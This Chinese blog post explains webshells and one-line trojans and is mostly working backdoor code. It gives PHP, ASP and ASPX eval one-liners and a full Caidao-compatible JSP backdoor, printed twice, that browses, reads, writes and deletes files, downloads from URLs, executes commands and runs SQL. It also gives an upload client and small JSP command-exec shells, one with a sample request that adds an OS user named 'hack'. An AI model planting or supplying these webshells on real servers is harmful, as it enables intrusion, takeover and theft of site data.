> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_36119192/article/details/84563791)

**目录**

[Webshell(大马)](#t0 "Webshell(大马)")

[一句话木马 (小马)](#t1 "一句话木马(小马)")

[一句话木马原理](#t2 "一句话木马原理 ") 

[一句话木马的变形](#t3 "一句话木马的变形")

[JSP 后门脚本](#t4 "JSP后门脚本")

### Webshell(大马)

我们经常会看到 Webshell，那么，到底什么是 Webshell 呢？

**webshell** 就是以 asp、aspx、php、jsp 或者 cgi 等网页文件形式存在的一种**命令执行环境**，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将 asp、aspx、php 或 jsp 后门文件与网站 web 服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问该后门文件了，从而得到一个命令执行环境，以达到控制网站服务器的目的。

顾名思义，“web” 的含义是显然需要服务器开放 web 服务，“shell” 的含义是取得对服务器某种程度上的操作权限。webshell 常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的**权限**。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。

一方面，webshell 被站长常常用于网站管理、服务器管理等等，根据 FSO 权限的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。

另一方面，被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常称为 Web 脚本木马，比较流行的 asp 或 php 木马，也有基于. NET 的脚本木马与 JSP 脚本木马。

但是这里所说的木马都是些体积 “庞大” 的木马，也就是黑客中常称呼的 "大马"。

### 一句话木马 (小马)

因为上面所介绍 webshell 概念中提到的大马在现阶段的安全领域中已经被盯的非常紧了，而且各种杀毒软件和防火墙软件都对这种 “大马” 有了甄别能力，所以如果被渗透的 web 服务器中安装了防御软件的话，留下这种大马作为自己的 webshell 就非常困难了，于是一种新型的 webshell 就横空出世了，那就是一句话木马。

简单来说一句话木马就是通过向服务端提交一句简短的代码来达到向服务器插入木马并最终获得 webshell 的方法。对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的 eval 或者是 execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是 request 或者是 $_POST 获取的值。如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。

一些不同脚本语言的一句话木马

```
php一句话木马：  <?php @eval($_POST[value]); ?>
asp一句话木马：  <%eval request ("value")%> 或  <% execute(request("value")) %>   
aspx一句话木马： <%@ Page Language="Jscript" %> <% eval(Request.Item["value"]) %>
 
<?php fputs( fopen('xie.php','w') , '<? php eval($_POST[xie]) ?>' ) ; ?>
将当前目录下创建xie.php文件，并且将一句话木马写入xd.php中
```

#### 一句话木马原理 

拿 php 的一句话木马说明一下原理：

在 PHP 脚本语言中，eval(code) 的功能是将 code 组合成 php 指令，然后将指令执行，其他语言中也是使用此原理，只是函数可能不同。

```
<%
    if("b".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

当利用 web 中的漏洞将 <?php @eval($_POST[value]);?> 一句话插入到了可以被黑客访问且能被 web 服务器执行的文件中时，那么我们就可以向此文件提交 post 数据，post 方式提交数据的参数就是这个一句话中的 value，它就称为一句话木马的密码。这样提交的数据如果是正确的 php 语言的语句，那么就可以被一句话木马执行，从而达到黑客的恶意目的。

介绍了一句话木马的原理后，我们再来说下它的优缺点：

****优点****：短小精悍，功能强大。

****缺点********：****容易被安全软件检测出来。为了增强隐蔽性，也出现了各种一句话木马的变形。

#### 一句话木马的变形

黑客的目的，就是想尽办法给目标网站插入一句话木马，可以是一个单独的 .asp 或者是 .php，.aspx 文件，或者是隐藏在某些网页下。

在上边的例子中，php 文件很明显的 eval 可以成为一个静态特征码，webshell 扫描工具可以以此为关键词，扫描到这种木马加以屏蔽。

### JSP 后门脚本

先把下面的代码保存为 one.jsp (该代码的作用是可以在当前目录下生成另外一个指定的文件)，然后上传到服务器

```
<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!String Pwd = "pass";     //菜刀连接密码
 
    String EC(String s, String c) throws Exception {
        return s;
    }//new String(s.getBytes("ISO-8859-1"),c);}
 
    Connection GC(String s) throws Exception {
        String[] x = s.trim().split("\r\n");
        Class.forName(x[0].trim()).newInstance();
        Connection c = DriverManager.getConnection(x[1].trim());
        if (x.length > 2) {
            c.setCatalog(x[2].trim());
        }
        return c;
    }
    void AA(StringBuffer sb) throws Exception {
        File r[] = File.listRoots();
        for (int i = 0; i < r.length; i++) {
            sb.append(r[i].toString().substring(0, 2));
        }
    }
    void BB(String s, StringBuffer sb) throws Exception {
        File oF = new File(s), l[] = oF.listFiles();
        String sT, sQ, sF = "";
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? "R" : "";
            sQ += l[i].canWrite() ? " W" : "";
            if (l[i].isDirectory()) {
                sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()
                        + "\t" + sQ + "\n");
            } else {
                sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"
                        + sQ + "\n";
            }
        }
        sb.append(sF);
    }
    void EE(String s) throws Exception {
        File f = new File(s);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    EE(x[k].getPath());
                }
            }
        }
        f.delete();
    }
    void FF(String s, HttpServletResponse r) throws Exception {
        int n;
        byte[] b = new byte[512];
        r.reset();
        ServletOutputStream os = r.getOutputStream();
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
        os.write(("->" + "|").getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write(("|" + "<-").getBytes(), 0, 3);
        os.close();
        is.close();
    }
    void GG(String s, String d) throws Exception {
        String h = "0123456789ABCDEF";
        int n;
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < d.length(); i += 2) {
            os
                    .write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d
                            .charAt(i + 1))));
        }
        os.close();
    }
    void HH(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[512];
            while ((n = is.read(b, 0, 512)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }
    void II(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        sf.renameTo(df);
    }
    void JJ(String s) throws Exception {
        File f = new File(s);
        f.mkdir();
    }
    void KK(String s, String t) throws Exception {
        File f = new File(s);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(t);
        f.setLastModified(dt.getTime());
    }
    void LL(String s, String d) throws Exception {
        URL u = new URL(s);
        int n;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }
    void MM(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
    }
    void NN(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        ResultSet r = c.getMetaData().getCatalogs();
        while (r.next()) {
            sb.append(r.getString(1) + "\t");
        }
        r.close();
        c.close();
    }
    void OO(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        String[] t = { "TABLE" };
        ResultSet r = c.getMetaData().getTables(null, null, "%", t);
        while (r.next()) {
            sb.append(r.getString("TABLE_NAME") + "\t");
        }
        r.close();
        c.close();
    }
    void PP(String s, StringBuffer sb) throws Exception {
        String[] x = s.trim().split("\r\n");
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1007);
        ResultSet r = m.executeQuery("select * from " + x[3]);
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i <= d.getColumnCount(); i++) {
            sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)
                    + ")\t");
        }
        r.close();
        m.close();
        c.close();
    }
    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {
        int i;
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1008);
        try {
            ResultSet r = m.executeQuery(q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (i = 1; i <= n; i++) {
                sb.append(d.getColumnName(i) + "\t|\t");
            }
            sb.append("\r\n");
            while (r.next()) {
                for (i = 1; i <= n; i++) {
                    sb.append(EC(r.getString(i), cs) + "\t|\t");
                }
                sb.append("\r\n");
            }
            r.close();
        } catch (Exception e) {
            sb.append("Result\t|\t\r\n");
            try {
                m.executeUpdate(q);
                sb.append("Execute Successfully!\t|\t\r\n");
            } catch (Exception ee) {
                sb.append(ee.toString() + "\t|\t\r\n");
            }
        }
        m.close();
        c.close();
    }%>    
<%
    String cs = request.getParameter("z0")==null?"gbk": request.getParameter("z0") + "";
    request.setCharacterEncoding(cs);
    response.setContentType("text/html;charset=" + cs);
    String Z = EC(request.getParameter(Pwd) + "", cs);
    String z1 = EC(request.getParameter("z1") + "", cs);
    String z2 = EC(request.getParameter("z2") + "", cs);
    StringBuffer sb = new StringBuffer("");
    try {
        sb.append("->" + "|");
        if (Z.equals("A")) {
            String s = new File(application.getRealPath(request
                    .getRequestURI())).getParent();
            sb.append(s + "\t");
            if (!s.substring(0, 1).equals("/")) {
                AA(sb);
            }
        } else if (Z.equals("B")) {
            BB(z1, sb);
        } else if (Z.equals("C")) {
            String l = "";
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(new FileInputStream(new File(
                            z1))));
            while ((l = br.readLine()) != null) {
                sb.append(l + "\r\n");
            }
            br.close();
        } else if (Z.equals("D")) {
            BufferedWriter bw = new BufferedWriter(
                    new OutputStreamWriter(new FileOutputStream(
                            new File(z1))));
            bw.write(z2);
            bw.close();
            sb.append("1");
        } else if (Z.equals("E")) {
            EE(z1);
            sb.append("1");
        } else if (Z.equals("F")) {
            FF(z1, response);
        } else if (Z.equals("G")) {
            GG(z1, z2);
            sb.append("1");
        } else if (Z.equals("H")) {
            HH(z1, z2);
            sb.append("1");
        } else if (Z.equals("I")) {
            II(z1, z2);
            sb.append("1");
        } else if (Z.equals("J")) {
            JJ(z1);
            sb.append("1");
        } else if (Z.equals("K")) {
            KK(z1, z2);
            sb.append("1");
        } else if (Z.equals("L")) {
            LL(z1, z2);
            sb.append("1");
        } else if (Z.equals("M")) {
            String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
            Process p = Runtime.getRuntime().exec(c);
            MM(p.getInputStream(), sb);
            MM(p.getErrorStream(), sb);
        } else if (Z.equals("N")) {
            NN(z1, sb);
        } else if (Z.equals("O")) {
            OO(z1, sb);
        } else if (Z.equals("P")) {
            PP(z1, sb);
        } else if (Z.equals("Q")) {
            QQ(cs, z1, z2, sb);
        }
    } catch (Exception e) {
        sb.append("ERROR" + ":// " + e.toString());
    }
    sb.append("|" + "<-");
    out.print(sb.toString());
%>
```

然后将下面的代码保存为 .html 格式的，直接双击本地打开。这是作为客户端去连接我们刚刚上传的 one.jsp 的

```
<html><head><title>JSP一句话木马客户端</title></head><div align=center>  <font color=red>专用JSP木马连接器</font><br><form name=get method=post>服务端地址<input name=url size=110 type=text>  <br><br><textarea name=t rows=20 cols=120>你要提交到服务器的代码</textarea><br>要保存成的文件名：<input  value=提交> </form>  <br>服务端代码：<br><textarea rows=5 cols=120><%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>   </textarea>  </div></body>
```

 我们双击打开该 html 文件

![](https://img-blog.csdnimg.cn/2019011613473011.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**无回显执行命令**

将下面的命令保存为 a.jsp，然后上传到服务器

```
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```

访问链接：[http://127.0.0.1:8080/EShop/a.jsp?i=net user hack 123 /add](http://127.0.0.1:8080/EShop/a.jsp?i=net%20user%20hack%20123%20/add "http://127.0.0.1:8080/EShop/a.jsp?i=net user hack 123 /add") 

![](https://img-blog.csdnimg.cn/20190116113325997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**有回显带密码执行命令**

将下面的命令保存为 b.jsp，然后上传到服务器

```
<%
    if("b".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

访问链接：[http://127.0.0.1:8080/EShop/b.jsp?pwd=b&i=ipconfig](http://127.0.0.1:8080/EShop/b.jsp?pwd=b&i=ipconfig "http://127.0.0.1:8080/EShop/b.jsp?pwd=b&i=ipconfig") 

![](https://img-blog.csdnimg.cn/20190116113913953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**JSP 一句话木马**

将下面保存为 shell.jsp，上传到服务器，然后用菜刀连接即可

![](https://img-blog.csdnimg.cn/20190116133840122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!String Pwd = "pass";     //菜刀连接密码
 
    String EC(String s, String c) throws Exception {
        return s;
    }//new String(s.getBytes("ISO-8859-1"),c);}
 
    Connection GC(String s) throws Exception {
        String[] x = s.trim().split("\r\n");
        Class.forName(x[0].trim()).newInstance();
        Connection c = DriverManager.getConnection(x[1].trim());
        if (x.length > 2) {
            c.setCatalog(x[2].trim());
        }
        return c;
    }
    void AA(StringBuffer sb) throws Exception {
        File r[] = File.listRoots();
        for (int i = 0; i < r.length; i++) {
            sb.append(r[i].toString().substring(0, 2));
        }
    }
    void BB(String s, StringBuffer sb) throws Exception {
        File oF = new File(s), l[] = oF.listFiles();
        String sT, sQ, sF = "";
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? "R" : "";
            sQ += l[i].canWrite() ? " W" : "";
            if (l[i].isDirectory()) {
                sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()
                        + "\t" + sQ + "\n");
            } else {
                sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"
                        + sQ + "\n";
            }
        }
        sb.append(sF);
    }
    void EE(String s) throws Exception {
        File f = new File(s);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    EE(x[k].getPath());
                }
            }
        }
        f.delete();
    }
    void FF(String s, HttpServletResponse r) throws Exception {
        int n;
        byte[] b = new byte[512];
        r.reset();
        ServletOutputStream os = r.getOutputStream();
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
        os.write(("->" + "|").getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write(("|" + "<-").getBytes(), 0, 3);
        os.close();
        is.close();
    }
    void GG(String s, String d) throws Exception {
        String h = "0123456789ABCDEF";
        int n;
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < d.length(); i += 2) {
            os
                    .write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d
                            .charAt(i + 1))));
        }
        os.close();
    }
    void HH(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[512];
            while ((n = is.read(b, 0, 512)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }
    void II(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        sf.renameTo(df);
    }
    void JJ(String s) throws Exception {
        File f = new File(s);
        f.mkdir();
    }
    void KK(String s, String t) throws Exception {
        File f = new File(s);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(t);
        f.setLastModified(dt.getTime());
    }
    void LL(String s, String d) throws Exception {
        URL u = new URL(s);
        int n;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }
    void MM(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
    }
    void NN(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        ResultSet r = c.getMetaData().getCatalogs();
        while (r.next()) {
            sb.append(r.getString(1) + "\t");
        }
        r.close();
        c.close();
    }
    void OO(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        String[] t = { "TABLE" };
        ResultSet r = c.getMetaData().getTables(null, null, "%", t);
        while (r.next()) {
            sb.append(r.getString("TABLE_NAME") + "\t");
        }
        r.close();
        c.close();
    }
    void PP(String s, StringBuffer sb) throws Exception {
        String[] x = s.trim().split("\r\n");
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1007);
        ResultSet r = m.executeQuery("select * from " + x[3]);
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i <= d.getColumnCount(); i++) {
            sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)
                    + ")\t");
        }
        r.close();
        m.close();
        c.close();
    }
    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {
        int i;
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1008);
        try {
            ResultSet r = m.executeQuery(q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (i = 1; i <= n; i++) {
                sb.append(d.getColumnName(i) + "\t|\t");
            }
            sb.append("\r\n");
            while (r.next()) {
                for (i = 1; i <= n; i++) {
                    sb.append(EC(r.getString(i), cs) + "\t|\t");
                }
                sb.append("\r\n");
            }
            r.close();
        } catch (Exception e) {
            sb.append("Result\t|\t\r\n");
            try {
                m.executeUpdate(q);
                sb.append("Execute Successfully!\t|\t\r\n");
            } catch (Exception ee) {
                sb.append(ee.toString() + "\t|\t\r\n");
            }
        }
        m.close();
        c.close();
    }%>    
<%
    String cs = request.getParameter("z0")==null?"gbk": request.getParameter("z0") + "";
    request.setCharacterEncoding(cs);
    response.setContentType("text/html;charset=" + cs);
    String Z = EC(request.getParameter(Pwd) + "", cs);
    String z1 = EC(request.getParameter("z1") + "", cs);
    String z2 = EC(request.getParameter("z2") + "", cs);
    StringBuffer sb = new StringBuffer("");
    try {
        sb.append("->" + "|");
        if (Z.equals("A")) {
            String s = new File(application.getRealPath(request
                    .getRequestURI())).getParent();
            sb.append(s + "\t");
            if (!s.substring(0, 1).equals("/")) {
                AA(sb);
            }
        } else if (Z.equals("B")) {
            BB(z1, sb);
        } else if (Z.equals("C")) {
            String l = "";
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(new FileInputStream(new File(
                            z1))));
            while ((l = br.readLine()) != null) {
                sb.append(l + "\r\n");
            }
            br.close();
        } else if (Z.equals("D")) {
            BufferedWriter bw = new BufferedWriter(
                    new OutputStreamWriter(new FileOutputStream(
                            new File(z1))));
            bw.write(z2);
            bw.close();
            sb.append("1");
        } else if (Z.equals("E")) {
            EE(z1);
            sb.append("1");
        } else if (Z.equals("F")) {
            FF(z1, response);
        } else if (Z.equals("G")) {
            GG(z1, z2);
            sb.append("1");
        } else if (Z.equals("H")) {
            HH(z1, z2);
            sb.append("1");
        } else if (Z.equals("I")) {
            II(z1, z2);
            sb.append("1");
        } else if (Z.equals("J")) {
            JJ(z1);
            sb.append("1");
        } else if (Z.equals("K")) {
            KK(z1, z2);
            sb.append("1");
        } else if (Z.equals("L")) {
            LL(z1, z2);
            sb.append("1");
        } else if (Z.equals("M")) {
            String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
            Process p = Runtime.getRuntime().exec(c);
            MM(p.getInputStream(), sb);
            MM(p.getErrorStream(), sb);
        } else if (Z.equals("N")) {
            NN(z1, sb);
        } else if (Z.equals("O")) {
            OO(z1, sb);
        } else if (Z.equals("P")) {
            PP(z1, sb);
        } else if (Z.equals("Q")) {
            QQ(cs, z1, z2, sb);
        }
    } catch (Exception e) {
        sb.append("ERROR" + ":// " + e.toString());
    }
    sb.append("|" + "<-");
    out.print(sb.toString());
%>
```

更多的关于一句话木马的变形，传送门——> [中国菜刀之写一句话木马变形](https://fly8wo.github.io/2018/08/17/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B9%8B%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%98%E5%BD%A2/ "中国菜刀之写一句话木马变形")

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)